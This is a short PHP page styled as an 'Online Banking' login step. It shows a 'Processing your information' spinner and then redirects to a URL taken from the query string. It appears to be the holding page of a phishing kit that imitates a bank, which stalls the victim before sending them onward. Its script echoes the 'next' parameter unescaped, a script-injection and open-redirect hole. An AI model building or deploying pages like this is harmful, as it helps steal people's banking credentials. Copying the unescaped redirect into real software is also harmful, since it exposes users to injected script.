<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/style.css">
    <title>Login</title>
</head>
<body>
<header>
<div class="left"><img src="res/img/logo.png" alt=""> </div>
<div class="right"><img src="res/img/sec.png" alt=""> </div>
</header>
<div class="liner">
Log In to Online Banking
</div>


<main>
<div class="form">

<div class="col">
  <h2>Please wait...</h2>
  <p>Processing your information...</p>
  <img src="res/img/loading.gif" style="width:60px;">
  </div>
 

</div>



</main>



<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 
</body>
</html>